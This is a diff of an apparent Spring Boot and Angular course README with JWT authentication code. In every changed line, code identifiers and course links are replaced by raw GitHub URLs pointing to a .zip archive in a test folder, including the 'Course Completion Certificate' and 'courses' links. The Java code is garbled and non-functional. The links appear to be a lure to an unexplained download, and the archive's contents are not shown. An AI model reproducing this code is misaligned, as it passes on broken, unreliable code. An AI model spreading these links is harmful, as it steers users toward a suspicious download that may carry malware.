+    return doGenerateToken(claims, https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip());
   }
 
   private String doGenerateToken(Map<String, Object> claims, String subject) {
-    final Date createdDate = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip();
+    final Date createdDate = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip();
     final Date expirationDate = calculateExpirationDate(createdDate);
 
-    return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip().setClaims(claims).setSubject(subject).setIssuedAt(createdDate)
-        .setExpiration(expirationDate).signWith(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip, secret).compact();
+    return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip().setClaims(claims).setSubject(subject).setIssuedAt(createdDate)
+        .setExpiration(expirationDate).signWith(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip, secret).compact();
   }
 
   public Boolean canTokenBeRefreshed(String token) {
@@ -405,24 +405,24 @@ public class JwtTokenUtil implements Serializable {
   }
 
   public String refreshToken(String token) {
-    final Date createdDate = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip();
+    final Date createdDate = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip();
     final Date expirationDate = calculateExpirationDate(createdDate);
 
     final Claims claims = getAllClaimsFromToken(token);
-    https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(createdDate);
-    https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(expirationDate);
+    https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(createdDate);
+    https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(expirationDate);
 
-    return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip().setClaims(claims).signWith(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip, secret).compact();
+    return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip().setClaims(claims).signWith(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip, secret).compact();
   }
 
   public Boolean validateToken(String token, UserDetails userDetails) {
     JwtUserDetails user = (JwtUserDetails) userDetails;
     final String username = getUsernameFromToken(token);
-    return (https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip()) && !isTokenExpired(token));
+    return (https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip()) && !isTokenExpired(token));
   }
 
   private Date calculateExpirationDate(Date createdDate) {
-    return new Date(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip() + expiration * 1000);
+    return new Date(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip() + expiration * 1000);
   }
 }
 
@@ -434,7 +434,7 @@ public class JwtUnAuthorizedResponseAuthenticationEntryPoint implements Authenti
   @Override
   public void commence(HttpServletRequest request, HttpServletResponse response,
       AuthenticationException authException) throws IOException {
-    https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip,
+    https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip,
         "You would need to provide the Jwt Token to Access This resource");
   }
 }
@@ -450,14 +450,14 @@ public class JwtUserDetails implements UserDetails {
   private final Collection<? extends GrantedAuthority> authorities;
 
   public JwtUserDetails(Long id, String username, String password, String role) {
-    https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip = id;
-    https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip = username;
-    https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip = password;
+    https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip = id;
+    https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip = username;
+    https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip = password;
 
     List<SimpleGrantedAuthority> authorities = new ArrayList<SimpleGrantedAuthority>();
-    https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(new SimpleGrantedAuthority(role));
+    https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(new SimpleGrantedAuthority(role));
 
-    https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip = authorities;
+    https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip = authorities;
   }
 
   @JsonIgnore
@@ -521,7 +521,7 @@ public class JWTWebSecurityConfig extends WebSecurityConfigurerAdapter {
     @Autowired
     private JwtTokenAuthorizationOncePerRequestFilter jwtAuthenticationTokenFilter;
 
-    @Value("${https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip}")
+    @Value("${https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip}")
     private String authenticationPath;
 
     @Autowired
@@ -539,7 +539,7 @@ public class JWTWebSecurityConfig extends WebSecurityConfigurerAdapter {
     @Bean
     @Override
     public AuthenticationManager authenticationManagerBean() throws Exception {
-        return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip();
+        return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip();
     }
 
     @Override
@@ -547,12 +547,12 @@ public class JWTWebSecurityConfig extends WebSecurityConfigurerAdapter {
         httpSecurity
             .csrf().disable()
             .exceptionHandling().authenticationEntryPoint(jwtUnAuthorizedResponseAuthenticationEntryPoint).and()
-            .sessionManagement().sessionCreationPolicy(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip).and()
+            .sessionManagement().sessionCreationPolicy(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip).and()
             .authorizeRequests()
             .anyRequest().authenticated();
 
        httpSecurity
-            .addFilterBefore(jwtAuthenticationTokenFilter, https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip);
+            .addFilterBefore(jwtAuthenticationTokenFilter, https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip);
         
         httpSecurity
             .headers()
@@ -565,14 +565,14 @@ public class JWTWebSecurityConfig extends WebSecurityConfigurerAdapter {
         webSecurity
             .ignoring()
             .antMatchers(
-                https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip,
+                https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip,
                 authenticationPath
             )
-            .antMatchers(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip, "/**")
+            .antMatchers(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip, "/**")
             .and()
             .ignoring()
             .antMatchers(
-                https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip,
+                https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip,
                 "/" //Other Stuff You want to Ignore
             )
             .and()
@@ -585,7 +585,7 @@ public class JWTWebSecurityConfig extends WebSecurityConfigurerAdapter {
 @CrossOrigin(origins="http://localhost:4200")
 public class JwtAuthenticationRestController {
 
-  @Value("${https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip}")
+  @Value("${https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip}")
   private String tokenHeader;
 
   @Autowired
@@ -597,45 +597,45 @@ public class JwtAuthenticationRestController {
   @Autowired
   private UserDetailsService jwtInMemoryUserDetailsService;
 
-  @RequestMapping(value = "${https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip}", method = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip)
+  @RequestMapping(value = "${https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip}", method = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip)
   public ResponseEntity<?> createAuthenticationToken(@RequestBody JwtTokenRequest authenticationRequest)
       throws AuthenticationException {
 
-    authenticate(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(), https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip());
+    authenticate(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(), https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip());
 
-    final UserDetails userDetails = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip());
+    final UserDetails userDetails = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip());
 
-    final String token = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(userDetails);
+    final String token = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(userDetails);
 
-    return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(new JwtTokenResponse(token));
+    return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(new JwtTokenResponse(token));
   }
 
-  @RequestMapping(value = "${https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip}", method = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip)
+  @RequestMapping(value = "${https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip}", method = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip)
   public ResponseEntity<?> refreshAndGetAuthenticationToken(HttpServletRequest request) {
-    String authToken = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(tokenHeader);
-    final String token = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(7);
-    String username = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(token);
-    JwtUserDetails user = (JwtUserDetails) https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(username);
+    String authToken = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(tokenHeader);
+    final String token = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(7);
+    String username = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(token);
+    JwtUserDetails user = (JwtUserDetails) https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(username);
 
-    if (https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(token)) {
-      String refreshedToken = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(token);
-      return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(new JwtTokenResponse(refreshedToken));
+    if (https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(token)) {
+      String refreshedToken = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(token);
+      return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(new JwtTokenResponse(refreshedToken));
     } else {
-      return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip().body(null);
+      return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip().body(null);
     }
   }
 
-  @ExceptionHandler({ https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip })
+  @ExceptionHandler({ https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip })
   public ResponseEntity<String> handleAuthenticationException(AuthenticationException e) {
-    return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip).body(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip());
+    return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip).body(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip());
   }
 
   private void authenticate(String username, String password) {
-    https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(username);
-    https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(password);
+    https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(username);
+    https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(password);
 
     try {
-      https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(new UsernamePasswordAuthenticationToken(username, password));
+      https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(new UsernamePasswordAuthenticationToken(username, password));
     } catch (DisabledException e) {
       throw new AuthenticationException("USER_DISABLED", e);
     } catch (BadCredentialsException e) {
@@ -662,24 +662,24 @@ public class  JwtTokenRequest implements Serializable {
     }
 
     public JwtTokenRequest(String username, String password) {
-        https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(username);
-        https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(password);
+        https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(username);
+        https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(password);
     }
 
     public String getUsername() {
-        return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip;
+        return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip;
     }
 
     public void setUsername(String username) {
-        https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip = username;
+        https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip = username;
     }
 
     public String getPassword() {
-        return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip;
+        return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip;
     }
 
     public void setPassword(String password) {
-        https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip = password;
+        https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip = password;
     }
 }
 
@@ -690,11 +690,11 @@ public class JwtTokenResponse implements Serializable {
   private final String token;
 
     public JwtTokenResponse(String token) {
-        https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip = token;
+        https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip = token;
     }
 
     public String getToken() {
-        return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip;
+        return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip;
     }
 }
 ```
@@ -817,17 +817,17 @@ TITLE : Bonus Lecture : Coupons for My Best-Selling Courses
 ```
 I hope you enjoyed it! 
 
-Connect and share your success (Course Completion Certificate) on Linked In - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+Connect and share your success (Course Completion Certificate) on Linked In - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 
 Here are coupons for many of my best-selling courses. Please click the images/courses below to watch the course video previews (all of these courses have 30-day 100% money back guarantees):
 
-- Copy relevant courses from https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+- Copy relevant courses from https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 
 ```
